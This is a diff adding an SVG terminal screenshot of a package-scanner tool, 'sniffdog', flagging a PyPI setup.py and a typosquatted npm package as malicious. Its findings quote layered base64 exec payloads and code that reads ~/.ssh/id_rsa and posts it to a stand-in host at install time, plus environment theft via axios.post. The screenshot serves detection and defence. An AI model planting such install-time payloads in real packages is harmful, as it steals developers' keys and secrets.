@@ -1,0 +1,225 @@
+<svg class="rich-terminal" viewBox="0 0 1458 1026.0" xmlns="http://www.w3.org/2000/svg">
+    <!-- Generated with Rich https://www.textualize.io -->
+    <style>
+
+    @font-face {
+        font-family: "Fira Code";
+        src: local("FiraCode-Regular"),
+                url("https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/woff2/FiraCode-Regular.woff2") format("woff2"),
+                url("https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/woff/FiraCode-Regular.woff") format("woff");
+        font-style: normal;
+        font-weight: 400;
+    }
+    @font-face {
+        font-family: "Fira Code";
+        src: local("FiraCode-Bold"),
+                url("https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/woff2/FiraCode-Bold.woff2") format("woff2"),
+                url("https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/woff/FiraCode-Bold.woff") format("woff");
+        font-style: bold;
+        font-weight: 700;
+    }
+
+    .terminal-1572737541-matrix {
+        font-family: Fira Code, monospace;
+        font-size: 20px;
+        line-height: 24.4px;
+        font-variant-east-asian: full-width;
+    }
+
+    .terminal-1572737541-title {
+        font-size: 18px;
+        font-weight: bold;
+        font-family: arial;
+    }
+
+    .terminal-1572737541-r1 { fill: #c5c8c6;font-weight: bold }
+.terminal-1572737541-r2 { fill: #98729f;font-weight: bold }
+.terminal-1572737541-r3 { fill: #ff2c7a;font-weight: bold }
+.terminal-1572737541-r4 { fill: #c5c8c6 }
+.terminal-1572737541-r5 { fill: #868887 }
+.terminal-1572737541-r6 { fill: #cc555a }
+.terminal-1572737541-r7 { fill: #cc555a;font-weight: bold }
+.terminal-1572737541-r8 { fill: #8a4346 }
+.terminal-1572737541-r9 { fill: #98729f }
+.terminal-1572737541-r10 { fill: #868887;font-style: italic; }
+.terminal-1572737541-r11 { fill: #4e707b;font-weight: bold }
+.terminal-1572737541-r12 { fill: #d0b344 }
+    </style>
+
+    <defs>
+    <clipPath id="terminal-1572737541-clip-terminal">
+      <rect x="0" y="0" width="1438.6" height="975.0" />
+    </clipPath>
+    <clipPath id="terminal-1572737541-line-0">
+    <rect x="0" y="1.5" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-1">
+    <rect x="0" y="25.9" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-2">
+    <rect x="0" y="50.3" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-3">
+    <rect x="0" y="74.7" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-4">
+    <rect x="0" y="99.1" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-5">
+    <rect x="0" y="123.5" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-6">
+    <rect x="0" y="147.9" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-7">
+    <rect x="0" y="172.3" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-8">
+    <rect x="0" y="196.7" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-9">
+    <rect x="0" y="221.1" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-10">
+    <rect x="0" y="245.5" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-11">
+    <rect x="0" y="269.9" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-12">
+    <rect x="0" y="294.3" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-13">
+    <rect x="0" y="318.7" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-14">
+    <rect x="0" y="343.1" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-15">
+    <rect x="0" y="367.5" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-16">
+    <rect x="0" y="391.9" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-17">
+    <rect x="0" y="416.3" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-18">
+    <rect x="0" y="440.7" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-19">
+    <rect x="0" y="465.1" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-20">
+    <rect x="0" y="489.5" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-21">
+    <rect x="0" y="513.9" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-22">
+    <rect x="0" y="538.3" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-23">
+    <rect x="0" y="562.7" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-24">
+    <rect x="0" y="587.1" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-25">
+    <rect x="0" y="611.5" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-26">
+    <rect x="0" y="635.9" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-27">
+    <rect x="0" y="660.3" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-28">
+    <rect x="0" y="684.7" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-29">
+    <rect x="0" y="709.1" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-30">
+    <rect x="0" y="733.5" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-31">
+    <rect x="0" y="757.9" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-32">
+    <rect x="0" y="782.3" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-33">
+    <rect x="0" y="806.7" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-34">
+    <rect x="0" y="831.1" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-35">
+    <rect x="0" y="855.5" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-36">
+    <rect x="0" y="879.9" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-37">
+    <rect x="0" y="904.3" width="1439.6" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-1572737541-line-38">
+    <rect x="0" y="928.7" width="1439.6" height="24.65"/>
+            </clipPath>
+    </defs>
+
+    <rect fill="#292929" stroke="rgba(255,255,255,0.35)" stroke-width="1" x="1" y="1" width="1456" height="1024" rx="8"/><text class="terminal-1572737541-title" fill="#c5c8c6" text-anchor="middle" x="728" y="27">sniffdog</text>
+            <g transform="translate(26,22)">
+            <circle cx="0" cy="0" r="7" fill="#ff5f57"/>
+            <circle cx="22" cy="0" r="7" fill="#febc2e"/>
+            <circle cx="44" cy="0" r="7" fill="#28c840"/>
+            </g>
+        
+    <g transform="translate(9, 41)" clip-path="url(#terminal-1572737541-clip-terminal)">
+    <rect fill="#cc555a" x="122" y="50.3" width="134.2" height="24.65" shape-rendering="crispEdges"/><rect fill="#cc555a" x="0" y="123.5" width="109.8" height="24.65" shape-rendering="crispEdges"/><rect fill="#cc555a" x="0" y="221.1" width="109.8" height="24.65" shape-rendering="crispEdges"/><rect fill="#cc555a" x="0" y="343.1" width="109.8" height="24.65" shape-rendering="crispEdges"/><rect fill="#cc555a" x="0" y="440.7" width="109.8" height="24.65" shape-rendering="crispEdges"/><rect fill="#cc555a" x="122" y="635.9" width="134.2" height="24.65" shape-rendering="crispEdges"/><rect fill="#cc555a" x="0" y="709.1" width="109.8" height="24.65" shape-rendering="crispEdges"/><rect fill="#cc555a" x="0" y="757.9" width="109.8" height="24.65" shape-rendering="crispEdges"/>
+    <g class="terminal-1572737541-matrix">
+    <text class="terminal-1572737541-r1" x="0" y="20" textLength="207.4" clip-path="url(#terminal-1572737541-line-0)">$&#160;sniffdog&#160;scan&#160;.</text><text class="terminal-1572737541-r2" x="207.4" y="20" textLength="12.2" clip-path="url(#terminal-1572737541-line-0)">/</text><text class="terminal-1572737541-r3" x="219.6" y="20" textLength="219.6" clip-path="url(#terminal-1572737541-line-0)">setup-tools-sample</text><text class="terminal-1572737541-r1" x="439.2" y="20" textLength="36.6" clip-path="url(#terminal-1572737541-line-0)">&#160;-v</text><text class="terminal-1572737541-r5" x="500.2" y="20" textLength="439.2" clip-path="url(#terminal-1572737541-line-0)">#&#160;layered&#160;base64&#160;payload&#160;in&#160;setup.py</text><text class="terminal-1572737541-r4" x="1439.6" y="20" textLength="12.2" clip-path="url(#terminal-1572737541-line-0)">
+</text><text class="terminal-1572737541-r6" x="0" y="44.4" textLength="24.4" clip-path="url(#terminal-1572737541-line-1)">╭─</text><text class="terminal-1572737541-r7" x="36.6" y="44.4" textLength="109.8" clip-path="url(#terminal-1572737541-line-1)">fastjsonx</text><text class="terminal-1572737541-r6" x="146.4" y="44.4" textLength="48.8" clip-path="url(#terminal-1572737541-line-1)">&#160;0.1</text><text class="terminal-1572737541-r8" x="195.2" y="44.4" textLength="97.6" clip-path="url(#terminal-1572737541-line-1)">&#160;&#160;[pypi]</text><text class="terminal-1572737541-r6" x="305" y="44.4" textLength="1110.2" clip-path="url(#terminal-1572737541-line-1)">───────────────────────────────────────────────────────────────────────────────────────────</text><text class="terminal-1572737541-r6" x="1415.2" y="44.4" textLength="24.4" clip-path="url(#terminal-1572737541-line-1)">─╮</text><text class="terminal-1572737541-r4" x="1439.6" y="44.4" textLength="12.2" clip-path="url(#terminal-1572737541-line-1)">
+</text><text class="terminal-1572737541-r6" x="0" y="68.8" textLength="12.2" clip-path="url(#terminal-1572737541-line-2)">│</text><text class="terminal-1572737541-r5" x="24.4" y="68.8" textLength="97.6" clip-path="url(#terminal-1572737541-line-2)">verdict&#160;</text><text class="terminal-1572737541-r1" x="122" y="68.8" textLength="134.2" clip-path="url(#terminal-1572737541-line-2)">&#160;MALICIOUS&#160;</text><text class="terminal-1572737541-r5" x="256.2" y="68.8" textLength="97.6" clip-path="url(#terminal-1572737541-line-2)">&#160;&#160;&#160;risk&#160;</text><text class="terminal-1572737541-r1" x="353.8" y="68.8" textLength="85.4" clip-path="url(#terminal-1572737541-line-2)">100/100</text><text class="terminal-1572737541-r5" x="439.2" y="68.8" textLength="109.8" clip-path="url(#terminal-1572737541-line-2)">&#160;&#160;&#160;files&#160;</text><text class="terminal-1572737541-r4" x="549" y="68.8" textLength="12.2" clip-path="url(#terminal-1572737541-line-2)">1</text><text class="terminal-1572737541-r5" x="561.2" y="68.8" textLength="97.6" clip-path="url(#terminal-1572737541-line-2)">&#160;&#160;&#160;time&#160;</text><text class="terminal-1572737541-r4" x="658.8" y="68.8" textLength="61" clip-path="url(#terminal-1572737541-line-2)">21&#160;ms</text><text class="terminal-1572737541-r6" x="1427.4" y="68.8" textLength="12.2" clip-path="url(#terminal-1572737541-line-2)">│</text><text class="terminal-1572737541-r4" x="1439.6" y="68.8" textLength="12.2" clip-path="url(#terminal-1572737541-line-2)">
+</text><text class="terminal-1572737541-r6" x="0" y="93.2" textLength="1439.6" clip-path="url(#terminal-1572737541-line-3)">╰────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯</text><text class="terminal-1572737541-r4" x="1439.6" y="93.2" textLength="12.2" clip-path="url(#terminal-1572737541-line-3)">
+</text><text class="terminal-1572737541-r1" x="0" y="117.6" textLength="109.8" clip-path="url(#terminal-1572737541-line-4)">sev&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-1572737541-r1" x="134.2" y="117.6" textLength="219.6" clip-path="url(#terminal-1572737541-line-4)">rule&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-1572737541-r1" x="378.2" y="117.6" textLength="780.8" clip-path="url(#terminal-1572737541-line-4)">finding&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-1572737541-r1" x="1183.4" y="117.6" textLength="256.2" clip-path="url(#terminal-1572737541-line-4)">location&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-1572737541-r4" x="1439.6" y="117.6" textLength="12.2" clip-path="url(#terminal-1572737541-line-4)">
+</text><text class="terminal-1572737541-r1" x="0" y="142" textLength="109.8" clip-path="url(#terminal-1572737541-line-5)">critical&#160;</text><text class="terminal-1572737541-r1" x="134.2" y="142" textLength="219.6" clip-path="url(#terminal-1572737541-line-5)">PY-EXFIL&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-1572737541-r4" x="378.2" y="142" textLength="780.8" clip-path="url(#terminal-1572737541-line-5)">credential/secret&#160;files&#160;flows&#160;into&#160;`urllib.request.urlopen`&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-1572737541-r5" x="1183.4" y="142" textLength="256.2" clip-path="url(#terminal-1572737541-line-5)">setup.py&lt;layer1@L3&gt;&lt;l</text><text class="terminal-1572737541-r4" x="1439.6" y="142" textLength="12.2" clip-path="url(#terminal-1572737541-line-5)">
+</text><text class="terminal-1572737541-r4" x="378.2" y="166.4" textLength="329.4" clip-path="url(#terminal-1572737541-line-6)">during&#160;package&#160;installation</text><text class="terminal-1572737541-r9" x="707.6" y="166.4" textLength="195.2" clip-path="url(#terminal-1572737541-line-6)">&#160;&#160;[install-time]</text><text class="terminal-1572737541-r5" x="1183.4" y="166.4" textLength="256.2" clip-path="url(#terminal-1572737541-line-6)">ayer2@L2&gt;:3&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-1572737541-r4" x="1439.6" y="166.4" textLength="12.2" clip-path="url(#terminal-1572737541-line-6)">
+</text><text class="terminal-1572737541-r10" x="378.2" y="190.8" textLength="732" clip-path="url(#terminal-1572737541-line-7)">&#160;&#160;&#160;&#160;urllib.request.urlopen(&#x27;https://keys.example.invalid/&#x27;,&#160;</text><text class="terminal-1572737541-r4" x="1439.6" y="190.8" textLength="12.2" clip-path="url(#terminal-1572737541-line-7)">
+</text><text class="terminal-1572737541-r10" x="378.2" y="215.2" textLength="195.2" clip-path="url(#terminal-1572737541-line-8)">data=k.encode())</text><text class="terminal-1572737541-r4" x="1439.6" y="215.2" textLength="12.2" clip-path="url(#terminal-1572737541-line-8)">
+</text><text class="terminal-1572737541-r1" x="0" y="239.6" textLength="109.8" clip-path="url(#terminal-1572737541-line-9)">critical&#160;</text><text class="terminal-1572737541-r1" x="134.2" y="239.6" textLength="219.6" clip-path="url(#terminal-1572737541-line-9)">PY-EXEC-OBFUSCATED</text><text class="terminal-1572737541-r4" x="378.2" y="239.6" textLength="549" clip-path="url(#terminal-1572737541-line-9)">decoded/decompressed&#160;data&#160;is&#160;passed&#160;to&#160;`exec`</text><text class="terminal-1572737541-r9" x="927.2" y="239.6" textLength="195.2" clip-path="url(#terminal-1572737541-line-9)">&#160;&#160;[install-time]</text><text class="terminal-1572737541-r5" x="1183.4" y="239.6" textLength="256.2" clip-path="url(#terminal-1572737541-line-9)">setup.py&lt;layer1@L3&gt;:2</text><text class="terminal-1572737541-r4" x="1439.6" y="239.6" textLength="12.2" clip-path="url(#terminal-1572737541-line-9)">
+</text><text class="terminal-1572737541-r10" x="378.2" y="264" textLength="780.8" clip-path="url(#terminal-1572737541-line-10)">&#160;&#160;&#160;&#160;exec(base64.b64decode(&#x27;aW1wb3J0IG9zLCB1cmxsaWIucmVxdWVzdApr…</text><text class="terminal-1572737541-r4" x="1439.6" y="264" textLength="12.2" clip-path="url(#terminal-1572737541-line-10)">
+</text><text class="terminal-1572737541-r5" x="378.2" y="288.4" textLength="549" clip-path="url(#terminal-1572737541-line-11)">&#160;&#160;&#160;&#160;decoded:&#160;&quot;import&#160;os,&#160;urllib.request\nk&#160;=&#160;</text><text class="terminal-1572737541-r4" x="1439.6" y="288.4" textLength="12.2" clip-path="url(#terminal-1572737541-line-11)">
+</text><text class="terminal-1572737541-r5" x="378.2" y="312.8" textLength="780.8" clip-path="url(#terminal-1572737541-line-12)">open(os.path.expanduser(&#x27;~/.ssh/id_rsa&#x27;)).read()\nurllib.reques…</text><text class="terminal-1572737541-r4" x="1439.6" y="312.8" textLength="12.2" clip-path="url(#terminal-1572737541-line-12)">
+</text><text class="terminal-1572737541-r5" x="378.2" y="337.2" textLength="231.8" clip-path="url(#terminal-1572737541-line-13)">data=k.encode())\n&quot;</text><text class="terminal-1572737541-r4" x="1439.6" y="337.2" textLength="12.2" clip-path="url(#terminal-1572737541-line-13)">
+</text><text class="terminal-1572737541-r1" x="0" y="361.6" textLength="109.8" clip-path="url(#terminal-1572737541-line-14)">critical&#160;</text><text class="terminal-1572737541-r1" x="134.2" y="361.6" textLength="219.6" clip-path="url(#terminal-1572737541-line-14)">PY-EXEC-OBFUSCATED</text><text class="terminal-1572737541-r4" x="378.2" y="361.6" textLength="549" clip-path="url(#terminal-1572737541-line-14)">decoded/decompressed&#160;data&#160;is&#160;passed&#160;to&#160;`exec`</text><text class="terminal-1572737541-r9" x="927.2" y="361.6" textLength="195.2" clip-path="url(#terminal-1572737541-line-14)">&#160;&#160;[install-time]</text><text class="terminal-1572737541-r5" x="1183.4" y="361.6" textLength="256.2" clip-path="url(#terminal-1572737541-line-14)">setup.py:3&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-1572737541-r4" x="1439.6" y="361.6" textLength="12.2" clip-path="url(#terminal-1572737541-line-14)">
+</text><text class="terminal-1572737541-r10" x="378.2" y="386" textLength="780.8" clip-path="url(#terminal-1572737541-line-15)">&#160;&#160;&#160;&#160;exec(base64.b64decode(&#x27;aW1wb3J0IGJhc2U2NApleGVjKGJhc2U2NC5i…</text><text class="terminal-1572737541-r4" x="1439.6" y="386" textLength="12.2" clip-path="url(#terminal-1572737541-line-15)">
+</text><text class="terminal-1572737541-r5" x="378.2" y="410.4" textLength="256.2" clip-path="url(#terminal-1572737541-line-16)">&#160;&#160;&#160;&#160;decoded:&#160;&quot;import&#160;</text><text class="terminal-1572737541-r4" x="1439.6" y="410.4" textLength="12.2" clip-path="url(#terminal-1572737541-line-16)">
+</text><text class="terminal-1572737541-r5" x="378.2" y="434.8" textLength="780.8" clip-path="url(#terminal-1572737541-line-17)">base64\nexec(base64.b64decode(&#x27;aW1wb3J0IG9zLCB1cmxsaWIucmVxdWVz…</text><text class="terminal-1572737541-r4" x="1439.6" y="434.8" textLength="12.2" clip-path="url(#terminal-1572737541-line-17)">
+</text><text class="terminal-1572737541-r1" x="0" y="459.2" textLength="109.8" clip-path="url(#terminal-1572737541-line-18)">critical&#160;</text><text class="terminal-1572737541-r1" x="134.2" y="459.2" textLength="219.6" clip-path="url(#terminal-1572737541-line-18)">OBF-ENCODED-CODE&#160;&#160;</text><text class="terminal-1572737541-r4" x="378.2" y="459.2" textLength="622.2" clip-path="url(#terminal-1572737541-line-18)">a&#160;328-char&#160;base64&#160;string&#160;decodes&#160;to&#160;executable&#160;code</text><text class="terminal-1572737541-r5" x="1183.4" y="459.2" textLength="256.2" clip-path="url(#terminal-1572737541-line-18)">setup.py:3&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-1572737541-r4" x="1439.6" y="459.2" textLength="12.2" clip-path="url(#terminal-1572737541-line-18)">
+</text><text class="terminal-1572737541-r9" x="378.2" y="483.6" textLength="170.8" clip-path="url(#terminal-1572737541-line-19)">[install-time]</text><text class="terminal-1572737541-r4" x="1439.6" y="483.6" textLength="12.2" clip-path="url(#terminal-1572737541-line-19)">
+</text><text class="terminal-1572737541-r10" x="378.2" y="508" textLength="780.8" clip-path="url(#terminal-1572737541-line-20)">&#160;&#160;&#160;&#160;exec(base64.b64decode(&#x27;aW1wb3J0IGJhc2U2NApleGVjKGJhc2U2NC5i…</text><text class="terminal-1572737541-r4" x="1439.6" y="508" textLength="12.2" clip-path="url(#terminal-1572737541-line-20)">
+</text><text class="terminal-1572737541-r5" x="378.2" y="532.4" textLength="256.2" clip-path="url(#terminal-1572737541-line-21)">&#160;&#160;&#160;&#160;decoded:&#160;&quot;import&#160;</text><text class="terminal-1572737541-r4" x="1439.6" y="532.4" textLength="12.2" clip-path="url(#terminal-1572737541-line-21)">
+</text><text class="terminal-1572737541-r5" x="378.2" y="556.8" textLength="780.8" clip-path="url(#terminal-1572737541-line-22)">base64\nexec(base64.b64decode(&#x27;aW1wb3J0IG9zLCB1cmxsaWIucmVxdWVz…</text><text class="terminal-1572737541-r4" x="1439.6" y="556.8" textLength="12.2" clip-path="url(#terminal-1572737541-line-22)">
+</text><text class="terminal-1572737541-r4" x="1439.6" y="581.2" textLength="12.2" clip-path="url(#terminal-1572737541-line-23)">
+</text><text class="terminal-1572737541-r1" x="0" y="605.6" textLength="207.4" clip-path="url(#terminal-1572737541-line-24)">$&#160;sniffdog&#160;scan&#160;.</text><text class="terminal-1572737541-r2" x="207.4" y="605.6" textLength="12.2" clip-path="url(#terminal-1572737541-line-24)">/</text><text class="terminal-1572737541-r3" x="219.6" y="605.6" textLength="317.2" clip-path="url(#terminal-1572737541-line-24)">typescript-eslinter-sample</text><text class="terminal-1572737541-r5" x="561.2" y="605.6" textLength="24.4" clip-path="url(#terminal-1572737541-line-24)">#&#160;</text><text class="terminal-1572737541-r11" x="585.6" y="605.6" textLength="48.8" clip-path="url(#terminal-1572737541-line-24)">2024</text><text class="terminal-1572737541-r5" x="634.4" y="605.6" textLength="195.2" clip-path="url(#terminal-1572737541-line-24)">&#160;npm&#160;scope-squat</text><text class="terminal-1572737541-r4" x="1439.6" y="605.6" textLength="12.2" clip-path="url(#terminal-1572737541-line-24)">
+</text><text class="terminal-1572737541-r6" x="0" y="630" textLength="24.4" clip-path="url(#terminal-1572737541-line-25)">╭─</text><text class="terminal-1572737541-r7" x="36.6" y="630" textLength="329.4" clip-path="url(#terminal-1572737541-line-25)">@typescript_eslinter/eslint</text><text class="terminal-1572737541-r6" x="366" y="630" textLength="85.4" clip-path="url(#terminal-1572737541-line-25)">&#160;8.57.1</text><text class="terminal-1572737541-r8" x="451.4" y="630" textLength="85.4" clip-path="url(#terminal-1572737541-line-25)">&#160;&#160;[npm]</text><text class="terminal-1572737541-r6" x="549" y="630" textLength="866.2" clip-path="url(#terminal-1572737541-line-25)">───────────────────────────────────────────────────────────────────────</text><text class="terminal-1572737541-r6" x="1415.2" y="630" textLength="24.4" clip-path="url(#terminal-1572737541-line-25)">─╮</text><text class="terminal-1572737541-r4" x="1439.6" y="630" textLength="12.2" clip-path="url(#terminal-1572737541-line-25)">
+</text><text class="terminal-1572737541-r6" x="0" y="654.4" textLength="12.2" clip-path="url(#terminal-1572737541-line-26)">│</text><text class="terminal-1572737541-r5" x="24.4" y="654.4" textLength="97.6" clip-path="url(#terminal-1572737541-line-26)">verdict&#160;</text><text class="terminal-1572737541-r1" x="122" y="654.4" textLength="134.2" clip-path="url(#terminal-1572737541-line-26)">&#160;MALICIOUS&#160;</text><text class="terminal-1572737541-r5" x="256.2" y="654.4" textLength="97.6" clip-path="url(#terminal-1572737541-line-26)">&#160;&#160;&#160;risk&#160;</text><text class="terminal-1572737541-r1" x="353.8" y="654.4" textLength="73.2" clip-path="url(#terminal-1572737541-line-26)">95/100</text><text class="terminal-1572737541-r5" x="427" y="654.4" textLength="109.8" clip-path="url(#terminal-1572737541-line-26)">&#160;&#160;&#160;files&#160;</text><text class="terminal-1572737541-r4" x="536.8" y="654.4" textLength="12.2" clip-path="url(#terminal-1572737541-line-26)">3</text><text class="terminal-1572737541-r5" x="549" y="654.4" textLength="97.6" clip-path="url(#terminal-1572737541-line-26)">&#160;&#160;&#160;time&#160;</text><text class="terminal-1572737541-r4" x="646.6" y="654.4" textLength="61" clip-path="url(#terminal-1572737541-line-26)">14&#160;ms</text><text class="terminal-1572737541-r6" x="1427.4" y="654.4" textLength="12.2" clip-path="url(#terminal-1572737541-line-26)">│</text><text class="terminal-1572737541-r4" x="1439.6" y="654.4" textLength="12.2" clip-path="url(#terminal-1572737541-line-26)">
+</text><text class="terminal-1572737541-r6" x="0" y="678.8" textLength="1439.6" clip-path="url(#terminal-1572737541-line-27)">╰────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯</text><text class="terminal-1572737541-r4" x="1439.6" y="678.8" textLength="12.2" clip-path="url(#terminal-1572737541-line-27)">
+</text><text class="terminal-1572737541-r1" x="0" y="703.2" textLength="109.8" clip-path="url(#terminal-1572737541-line-28)">sev&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-1572737541-r1" x="134.2" y="703.2" textLength="268.4" clip-path="url(#terminal-1572737541-line-28)">rule&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-1572737541-r1" x="427" y="703.2" textLength="744.2" clip-path="url(#terminal-1572737541-line-28)">finding&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-1572737541-r1" x="1195.6" y="703.2" textLength="244" clip-path="url(#terminal-1572737541-line-28)">location&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-1572737541-r4" x="1439.6" y="703.2" textLength="12.2" clip-path="url(#terminal-1572737541-line-28)">
+</text><text class="terminal-1572737541-r1" x="0" y="727.6" textLength="109.8" clip-path="url(#terminal-1572737541-line-29)">critical&#160;</text><text class="terminal-1572737541-r1" x="134.2" y="727.6" textLength="268.4" clip-path="url(#terminal-1572737541-line-29)">JS-EXFIL&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-1572737541-r4" x="427" y="727.6" textLength="744.2" clip-path="url(#terminal-1572737541-line-29)">the&#160;entire&#160;environment,&#160;host&#160;fingerprint&#160;(hostname/user)&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-1572737541-r5" x="1195.6" y="727.6" textLength="244" clip-path="url(#terminal-1572737541-line-29)">install.js:3&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-1572737541-r4" x="1439.6" y="727.6" textLength="12.2" clip-path="url(#terminal-1572737541-line-29)">
+</text><text class="terminal-1572737541-r4" x="427" y="752" textLength="512.4" clip-path="url(#terminal-1572737541-line-30)">flows&#160;into&#160;`axios.post`&#160;during&#160;npm&#160;install</text><text class="terminal-1572737541-r9" x="939.4" y="752" textLength="195.2" clip-path="url(#terminal-1572737541-line-30)">&#160;&#160;[install-time]</text><text class="terminal-1572737541-r4" x="1439.6" y="752" textLength="12.2" clip-path="url(#terminal-1572737541-line-30)">
+</text><text class="terminal-1572737541-r1" x="0" y="776.4" textLength="109.8" clip-path="url(#terminal-1572737541-line-31)">critical&#160;</text><text class="terminal-1572737541-r1" x="134.2" y="776.4" textLength="268.4" clip-path="url(#terminal-1572737541-line-31)">CORR-TYPOSQUAT-PAYLOAD</text><text class="terminal-1572737541-r4" x="427" y="776.4" textLength="744.2" clip-path="url(#terminal-1572737541-line-31)">`@typescript_eslinter/eslint`&#160;resembles&#160;`eslint`&#160;(#104&#160;most&#160;&#160;</text><text class="terminal-1572737541-r5" x="1195.6" y="776.4" textLength="244" clip-path="url(#terminal-1572737541-line-31)">install.js:3&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-1572737541-r4" x="1439.6" y="776.4" textLength="12.2" clip-path="url(#terminal-1572737541-line-31)">
+</text><text class="terminal-1572737541-r4" x="427" y="800.8" textLength="744.2" clip-path="url(#terminal-1572737541-line-32)">downloaded&#160;on&#160;npm)&#160;via&#160;unofficial&#160;scope&#160;@typescript_eslinter&#160;</text><text class="terminal-1572737541-r4" x="1439.6" y="800.8" textLength="12.2" clip-path="url(#terminal-1572737541-line-32)">
+</text><text class="terminal-1572737541-r4" x="427" y="825.2" textLength="744.2" clip-path="url(#terminal-1572737541-line-33)">on&#160;a&#160;popular&#160;unscoped&#160;name,&#160;and&#160;it&#160;also&#160;contains:&#160;sensitive&#160;&#160;</text><text class="terminal-1572737541-r4" x="1439.6" y="825.2" textLength="12.2" clip-path="url(#terminal-1572737541-line-33)">
